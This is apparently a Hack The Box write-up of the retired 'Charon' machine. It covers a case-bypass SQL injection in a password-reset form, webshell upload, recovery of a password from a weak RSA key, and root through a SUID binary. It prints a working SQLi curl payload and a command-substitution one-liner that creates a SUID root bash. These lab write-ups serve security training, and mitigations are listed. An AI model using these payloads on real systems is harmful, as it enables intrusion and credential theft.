---
machine: Charon
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, sqli, rsa, suid, privesc]
---

# Charon — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The password reset form is injectable. A `UNION` filter bypass and `GROUP_CONCAT` dump users and MD5 hashes; with `decoder` a webshell is uploaded to the CMS. The home directory holds a small-modulus RSA public key and `pass.crypt`; factoring the modulus decrypts the password and allows SSH. A SUID `supershell` passes its argument to `system`, so command substitution runs code as root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH and `80/tcp` Apache with a news CMS.
- `gobuster` finds `/cmsdata/` and the `forgot.php` form.
- The site uses PHP and a MySQL database.

## Enumeration

- `forgot.php` reflects the query result: a `'` produces a database error.
- The filter blocks uppercase `UNION`; `UNiON` bypasses it.
- The query returns four columns and the fourth must be a valid email.

## Foothold

Use `UNION SELECT 1,group_concat(concat(__username_,':',__password_)),3,'a@b.c' from operators` to dump users and hashes. Crack the MD5s and log in to the CMS as `decoder`. The CMS image uploader accepts PHP when the extension and MIME type are changed.

```bash
curl -s http://<IP>/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(concat(__username_,':',__password_)),3,'a@b.c' from operators;-- -"
```

## Lateral movement

The shell is `www-data`. `/home/decoder` contains `decoder.pub`, `pass.crypt` and the user flag. The RSA modulus is too small: factor it, compute `d` and decrypt `pass.crypt` to recover `decoder`'s password, which works over SSH.

```python
from Crypto.PublicKey import RSA
key = RSA.importKey(open("decoder.pub").read())
# factor key.n and compute d
```

## Privilege escalation

`find / -perm -4000` shows `supershell`, owned by root and SUID. The binary calls `system()` on its argument; command substitution can copy a key or spawn a shell.

```bash
supershell '/bin/ls $(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)'
/tmp/rootbash -p
```

## Evidence

- SQLi error and `UNiON` bypass.
- Dumped users and hashes; CMS access as `decoder`.
- Small-modulus RSA key and decrypted `pass.crypt`.
- SUID `supershell` and command substitution execution.

## Lessons learned

- Filters that only match uppercase are bypassed by changing case.
- Small RSA moduli are factored in seconds.
- A SUID binary calling `system` on user input is direct root execution.

## Mitigation and detection

- Use parameterized queries and validate email server-side.
- Use RSA keys of at least 2048 bits and never encrypt secrets with a weak public key.
- Avoid unnecessary SUID binaries and never pass arguments to `system`.

## References

- [0xdf — Charon](https://0xdf.gitlab.io/2021/02/16/htb-charon.html)
- [IppSec — Charon](https://www.youtube.com/watch?v=_csbKuOlmdE)
- [Hack The Box — Charon](https://app.hackthebox.com/machines/charon)
